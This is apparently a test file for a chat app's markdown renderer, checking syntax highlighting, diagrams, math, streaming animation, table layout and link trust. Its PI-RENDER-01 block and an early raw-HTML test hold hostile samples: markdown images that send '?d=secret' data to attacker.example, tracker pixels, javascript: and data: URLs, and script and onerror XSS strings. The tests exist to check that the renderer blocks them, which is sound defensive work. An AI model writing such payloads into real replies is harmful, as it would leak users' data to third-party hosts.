// CHAT-RICH-01: markdown-text.tsx wires shiki, mermaid and math into
// Streamdown's componentsByLanguage/SyntaxHighlighter adapter
// slots (assistant-ui's documented shape) - these confirm the wiring
// reaches real rendered output, the same scripted-adapter harness
// thread.aui.test.tsx already uses for a real run through the real
// composer/thread, not a mocked recall() of markdown-text's own props.
import { afterEach, beforeAll, describe, expect, test } from "bun:test";
import { cleanup, fireEvent, render, waitFor } from "@testing-library/react";
import { AssistantRuntimeProvider, AuiConfig, AuiProvider, MessagePrimitive, useLocalRuntime, type ChatModelAdapter } from "@assistant-ui/react";
import type { RemendConfig } from "@assistant-ui/react-streamdown";
import { Thread } from "./thread.aui";
import { STREAMING_TEXT_ANIMATION } from "./markdown-text";
import { MarkdownText } from "./markdown-text";

afterEach(cleanup);
beforeAll(async () => { await import("@assistant-ui/react-streamdown"); });

function scriptedAdapter(reply: string, pauseAfterYieldMs = 0): ChatModelAdapter {
  return {
    async *run() {
      yield { content: [{ type: "text", text: reply }] };
      if (pauseAfterYieldMs) await new Promise((resolve) => setTimeout(resolve, pauseAfterYieldMs));
    },
  };
}

function Harness({ reply, preprocess, pauseAfterYieldMs, remend, trustedLinks }: { reply: string; preprocess?: (text: string, context: { streaming: boolean }) => string; pauseAfterYieldMs?: number; remend?: RemendConfig; trustedLinks?: readonly string[] }) {
  const runtime = useLocalRuntime(scriptedAdapter(reply, pauseAfterYieldMs));
  const markdown = preprocess || remend || trustedLinks ? { markdown: { preprocess, remend, trustedLinks } } : undefined;
  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <Thread components={markdown} />
    </AssistantRuntimeProvider>
  );
}

async function sendAndSettle(container: HTMLElement, getByRole: (role: string, opts: { name: string }) => HTMLElement) {
  fireEvent.change(getByRole("textbox", { name: "Message input" }), { target: { value: "hi" } });
  fireEvent.click(getByRole("button", { name: "Send message" }));
  await waitFor(() => {
    expect(container.querySelector(".aui-md")).toBeTruthy();
    expect(container.querySelector('[aria-label="Formatting message"]')).toBeNull();
  }, { timeout: 10_000 });
}

describe("markdown-text.tsx: rich content wiring (CHAT-RICH-01)", () => {
  test("standalone MarkdownText renders remote image safely and keeps an ordinary link visible", async () => {
    const config = AuiConfig({});
    const { container } = render(<AuiProvider config={config}>
      <MarkdownText text={'![remote](https://attacker.example/image.png) [read more](https://example.com/article)'} />
    </AuiProvider>);
    await waitFor(() => expect(container.querySelector(".aui-md")?.textContent).toContain("read more"));
    expect(container.querySelector('.aui-md img[src="https://attacker.example/image.png"]')).toBeNull();
    expect(container.querySelector('.aui-md a[href="https://example.com/article"]')).toBeNull();
    expect(container.querySelector(".aui-md")?.textContent).toContain("https://example.com/article");
  });

  test("raw HTML is rendered as text, including active-looking tags", async () => {
    const reply = '<script>alert("x")</script> <img src=x onerror="alert(1)">';
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);

    const markdown = container.querySelector(".aui-md")!;
    expect(markdown.querySelector("script, img")).toBeNull();
    expect(markdown.textContent).toBe(reply);
  });

  test("word animation is active only for a running assistant text part", async () => {
    const { container, getByRole } = render(
      <Harness reply="New words arrive here." pauseAfterYieldMs={500} />,
    );
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
    expect(container.querySelector("[data-sd-animate]")).toBeTruthy();
  });

  test("reduced motion disables Streamdown's word animation", async () => {
    const originalMatchMedia = window.matchMedia;
    window.matchMedia = ((query: string) => ({
      matches: query === "(prefers-reduced-motion: reduce)",
      media: query,
      onchange: null,
      addListener: () => {},
      removeListener: () => {},
      addEventListener: () => {},
      removeEventListener: () => {},
      dispatchEvent: () => false,
    })) as typeof window.matchMedia;
    try {
      const { container, getByRole } = render(
        <Harness reply="New words arrive here." pauseAfterYieldMs={500} />,
      );
      await sendAndSettle(container, getByRole);
      await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
      expect(container.querySelector("[data-sd-animate]")).toBeNull();
    } finally {
      window.matchMedia = originalMatchMedia;
    }
  });

  // STREAMING-TEXT-01: the reply streams with the streaming-text Element's
  // look (word fades in tinted, settles to ink, caret after the last word),
  // through Streamdown's own custom-animation name and caret props.
  test("a streaming reply's new words use the streaming-text animation, not the old 150 ms fade", async () => {
    const { container, getByRole } = render(
      <Harness reply="New words arrive here." pauseAfterYieldMs={500} />,
    );
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
    const word = container.querySelector<HTMLElement>("[data-sd-animate]");
    expect(word?.style.getPropertyValue("--sd-animation").trim()).toBe(`sd-${STREAMING_TEXT_ANIMATION.animation}`);
    expect(word?.style.getPropertyValue("--sd-duration").trim()).toBe(`${STREAMING_TEXT_ANIMATION.duration}ms`);
  });

  test("the first streamed word is shown with no added delay", async () => {
    const { container, getByRole } = render(
      <Harness reply="First words land at once." pauseAfterYieldMs={500} />,
    );
    await sendAndSettle(container, getByRole);
    const first = await waitFor(() => {
      const el = container.querySelector<HTMLElement>("[data-sd-animate]");
      expect(el).toBeTruthy();
      return el!;
    });
    expect(first.textContent).toContain("First");
    expect(first.style.getPropertyValue("--sd-delay").trim() || "0ms").toBe("0ms");
  });

  test("a caret follows the last word only while the reply streams", async () => {
    const { container, getByRole } = render(
      <Harness reply="Caret while streaming." pauseAfterYieldMs={500} />,
    );
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
    expect(container.querySelector<HTMLElement>(".aui-md")?.getAttribute("style") ?? "").toContain("--streamdown-caret");
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="complete"]')).toBeTruthy(), { timeout: 5_000 });
    expect(container.querySelector<HTMLElement>(".aui-md")?.getAttribute("style") ?? "").not.toContain("--streamdown-caret");
    expect(container.querySelector("[data-sd-animate]")).toBeNull();
  });

  test("unclosed emphasis at the streaming tail renders without raw markers", async () => {
    const { container, getByRole } = render(<Harness reply="Some **bold words" pauseAfterYieldMs={500} />);
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
    await waitFor(() => expect(container.querySelector(".aui-md strong")?.textContent).toContain("bold words"));
    expect(container.querySelector(".aui-md")?.textContent).not.toContain("**");
  });

  test("an open code fence at the streaming tail renders as code, with the caret held back", async () => {
    const { container, getByRole } = render(<Harness reply={"Code:\n\n```ts\nconst x = 1;"} pauseAfterYieldMs={500} />);
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
    await waitFor(() => expect(container.querySelector(".aui-md pre, .aui-md .aui-shiki-base")).toBeTruthy());
    expect(container.querySelector(".aui-md")?.textContent).not.toContain("```");
    expect(container.querySelector(".aui-md > :last-child")?.hasAttribute("data-sd-caret-hidden")).toBe(true);
  });

  test("the stylesheet draws the Element's fade, tint and settle from Streamdown's stamps, with a reduced-motion stop", async () => {
    const css = await Bun.file(new URL("./markdown-text.css", import.meta.url)).text();
    expect(css).toContain('.aui-md > :last-child [data-sd-animate]:not([style*="--sd-duration: 0ms"]):not([style*="--sd-duration:0ms"]) {\n  color: var(--aui-streaming-tint);');
    expect(css).toMatch(/@starting-style \{\s*\.aui-md \[data-sd-animate\]:not\(\[style\*="--sd-duration: 0ms"\]\):not\(\[style\*="--sd-duration:0ms"\]\) \{\s*opacity: 0;/);
    expect(css).toMatch(/opacity 500ms ease var\(--sd-delay, 0ms\),\s*color 700ms ease;/);
    expect(css).toMatch(/prefers-reduced-motion: reduce[\s\S]*\[data-sd-animate\][\s\S]*animation: none !important;\s*transition: none !important;/);
  });

  test("Streamdown restamps an already-shown word with a zero duration, which the stylesheet reads as settled", async () => {
    const { container, getByRole } = render(<Harness reply="Older words then newer words." pauseAfterYieldMs={500} />);
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.closest('[data-status="running"]')).toBeTruthy());
    const word = container.querySelector<HTMLElement>("[data-sd-animate]")!;
    // The selector in markdown-text.css matches this exact serialization.
    expect(word.getAttribute("style") ?? "").toMatch(/--sd-duration: (?:500|0)ms/);
  });

  test("wide tables stay inside a horizontally scrollable wrapper", async () => {
    const reply = `| ${Array.from({ length: 8 }, (_, i) => `Column ${i}`).join(" | ")} |\n| ${Array(8).fill("---").join(" | ")} |\n| ${Array.from({ length: 8 }, (_, i) => `value ${i}`).join(" | ")} |`;
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);
    const wrapper = container.querySelector<HTMLElement>(".aui-md-table-wrapper");
    const table = wrapper?.querySelector("table");
    if (wrapper && table) {
      Object.defineProperty(wrapper, "clientWidth", { configurable: true, value: 342 });
      Object.defineProperty(wrapper, "scrollWidth", { configurable: true, value: 1063 });
      Object.defineProperty(table, "scrollWidth", { configurable: true, value: 1063 });
    }
    expect(wrapper?.className).toContain("overflow-x-auto");
    expect(wrapper?.className).toContain("max-w-full");
    expect(table?.className).toContain("min-w-max");
    expect(table!.scrollWidth).toBeGreaterThan(wrapper!.clientWidth);
  });
  test("markdown preprocess receives the current message streaming state", async () => {
    const streamingStates: boolean[] = [];
    const preprocess = (text: string, context: { streaming: boolean }) => {
      streamingStates.push(context.streaming);
      return text;
    };
    const { container, getByRole } = render(<Harness reply="partial markdown" preprocess={preprocess} pauseAfterYieldMs={100} />);
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(streamingStates).toContain(true));
    await waitFor(() => expect(streamingStates).toContain(false));
  });

  test("Thread passes Streamdown's link repair settings through to MarkdownText", async () => {
    const reply = "See [a stable link](https://example.com";
    const { container, getByRole } = render(
      <Harness reply={reply} remend={{ links: false, linkMode: "text-only" }} pauseAfterYieldMs={500} />,
    );
    await sendAndSettle(container, getByRole);
    await waitFor(() => expect(container.querySelector(".aui-md")?.textContent).toContain("a stable link"));
    expect(container.querySelector(".aui-md a")).toBeNull();
    expect(container.querySelector(".aui-md")?.textContent).not.toContain("streamdown:");
  });

  test("Thread markdown preprocess composes with math preprocessing", async () => {
    const { container, getByRole } = render(<Harness reply="citation 7" preprocess={(text) => text.replace("7", "[7](#citation-7)")} />);
    await sendAndSettle(container, getByRole);
    expect(container.querySelector('a[href="#citation-7"]')?.textContent).toBe("7");
  });

  test("a fenced typescript block renders through the shiki SyntaxHighlighter, not a plain <pre>", async () => {
    const reply = "```typescript\nconst x: number = 1;\n```";
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);

    // CHAT-RICH-02: shiki is lazy now - the Suspense fallback (a plain
    // PendingCodeBlock) renders first, so this waits for its own chunk.
    const highlighted = await waitFor(() => {
      const el = container.querySelector(".aui-shiki-base");
      expect(el).toBeTruthy();
      return el;
    });
    expect(highlighted?.querySelector("code")).toBeTruthy();
    expect(container.querySelector(".aui-code-header-root button")).toBeTruthy();
  });

  test("a fenced mermaid block renders as a diagram, not a code block", async () => {
    const reply = "```mermaid\ngraph TD\nA-->B\n```";
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);

    // CHAT-RICH-02: mermaid is lazy now - same Suspense wait as shiki above.
    await waitFor(() => expect(container.querySelector('[data-slot="mermaid-diagram"]')).toBeTruthy());
    expect(container.querySelector(".aui-shiki-base")).toBeNull();
  });

  test("inline math delimiters render through KaTeX", async () => {
    const reply = "the answer is $x^2$ for any x";
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);

    // CHAT-RICH-02: remark-math/rehype-katex load only once MATH_HINT
    // matches this message's own text, so the first render has no
    // katex output at all - wait for the dynamic import to resolve.
    await waitFor(() => expect(container.querySelector(".katex")).toBeTruthy());
  });

  test("a currency amount is never eaten as math", async () => {
    const reply = "it costs $5 and $7 for the pair";
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);

    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toContain("$5");
    expect(container.textContent).toContain("$7");
  });

  test("an unlisted inline link renders as visible text", async () => {
    const reply = "see [this site](https://example.com/page) for more";
    const { container, getByRole } = render(<Harness reply={reply} />);
    await sendAndSettle(container, getByRole);

    expect(container.querySelector('a[href="https://example.com/page"]')).toBeNull();
    expect(container.textContent).toContain("https://example.com/page");
  });

  test("a trusted URL prefix does not trust a different URL with a longer suffix", async () => {
    const { container, getByRole } = render(
      <Harness reply="[listed](https://example.com/page) [lookalike](https://example.com/page.evil)" trustedLinks={["https://example.com/page"]} />,
    );
    await sendAndSettle(container, getByRole);
    expect(container.querySelector('a[href="https://example.com/page"]')).not.toBeNull();
    expect(container.querySelector('a[href="https://example.com/page.evil"]')).toBeNull();
    expect(container.textContent).toContain("https://example.com/page.evil");
  });

  test("an exact trusted URL stays a no-referrer link", async () => {
    const url = "https://example.com/page";
    const { container, getByRole } = render(<Harness reply={`see [this site](${url})`} trustedLinks={[url]} />);
    await sendAndSettle(container, getByRole);

    const link = container.querySelector(`a[href="${url}"]`);
    expect(link).not.toBeNull();
    expect(link!.getAttribute("target")).toBe("_blank");
    expect(link!.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link!.getAttribute("referrerpolicy")).toBe("no-referrer");
  });

  // PI-RENDER-01 (F1): a model-written image must never make the browser fetch
  // a remote host. Asserted on the DOM: no <img>/<source>/<iframe>/<object>
  // whose address is anything but a hub-own proxy path.
  const hostile: Array<[string, string]> = [
    ["a remote markdown image", "before ![x](https://attacker.example/?d=secret) after"],
    ["an HTML img", 'before <img src="https://attacker.example/p.gif"> after'],
    ["a reference-style image", "before ![x][r] after\n\n[r]: https://attacker.example/?d=secret"],
    ["a non-image data URL", "before ![x](data:text/html,alert(1)) after"],
    ["a protocol-relative image", "before ![x](//attacker.example/p.gif) after"],
    ["a 1x1 tracker", "before ![](https://t.attacker.example/1x1.gif?u=abc) after"],
    ["a javascript: image", "before ![x](javascript:alert(1)) after"],
  ];
  const fetchable = (container: HTMLElement) =>
    Array.from(container.querySelectorAll("[src], [srcset], object[data]")).filter((el) => {
      const v = el.getAttribute("src") ?? el.getAttribute("srcset") ?? el.getAttribute("data") ?? "";
      return !v.startsWith("/api/answer-image/");
    });

  for (const [name, reply] of hostile) {
    test(`PI-RENDER-01: ${name} fetches nothing and shows a blocked placeholder (stored)`, async () => {
      const { container, getByRole } = render(<Harness reply={reply} />);
      await sendAndSettle(container, getByRole);
      const md = container.querySelector(".aui-md")!;
      expect(fetchable(md as HTMLElement)).toEqual([]);
      expect(md.textContent).toContain("before");
      expect(md.textContent).toContain("after");
    });
    test(`PI-RENDER-01: ${name} fetches nothing while streaming`, async () => {
      const { container, getByRole } = render(<Harness reply={reply} pauseAfterYieldMs={400} />);
      await sendAndSettle(container, getByRole);
      expect(container.querySelector('[data-status="running"]')).toBeTruthy();
      expect(fetchable(container.querySelector(".aui-md") as HTMLElement)).toEqual([]);
    });
  }

  test("PI-RENDER-01: a blocked remote image says so and keeps the alt text", async () => {
    const { container, getByRole } = render(<Harness reply="![a red barn](https://attacker.example/?d=x)" />);
    await sendAndSettle(container, getByRole);
    const md = container.querySelector(".aui-md")!;
    expect(md.textContent).toContain("a red barn");
    expect(md.textContent).toContain("Image blocked");
    expect(md.textContent).not.toContain("attacker.example");
  });

  test("PI-RENDER-01: a hub proxy image still renders", async () => {
    const { container, getByRole } = render(<Harness reply="![barn](/api/answer-image/abc123)" />);
    await sendAndSettle(container, getByRole);
    const img = container.querySelector(".aui-md img");
    expect(img?.getAttribute("src")).toBe("/api/answer-image/abc123");
  });

  test("PI-RENDER-01: model data and blob images are blocked at the renderer", async () => {
    const dataUrl = "data:image/png;base64,iVBORw0KGgo=";
    const blobUrl = "blob:http://localhost/1234";
    const { container, getByRole } = render(<Harness reply={`![local](${dataUrl}) ![preview](${blobUrl})`} />);
    await sendAndSettle(container, getByRole);
    expect(container.querySelector(`img[src="${dataUrl}"]`)).toBeNull();
    expect(container.querySelector(`img[src="${blobUrl}"]`)).toBeNull();
  });

  test("PI-RENDER-01: a javascript: link is never an href", async () => {
    const { container, getByRole } = render(<Harness reply="[click](javascript:alert(1))" />);
    await sendAndSettle(container, getByRole);
    const hrefs = Array.from(container.querySelectorAll(".aui-md a")).map((a) => a.getAttribute("href") ?? "");
    expect(hrefs.some((h) => h.toLowerCase().startsWith("javascript:"))).toBe(false);
  });

  test("PI-RENDER-01: a normal link still works and shows its full address", async () => {
    const url = "https://example.com/page?q=1";
    const { container, getByRole } = render(<Harness reply={`see [this](${url}) now`} trustedLinks={[url]} />);
    await sendAndSettle(container, getByRole);
    const link = container.querySelector('.aui-md a[href="https://example.com/page?q=1"]')!;
    expect(link).not.toBeNull();
    expect(link.getAttribute("title")).toBe("https://example.com/page?q=1");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
  });
});
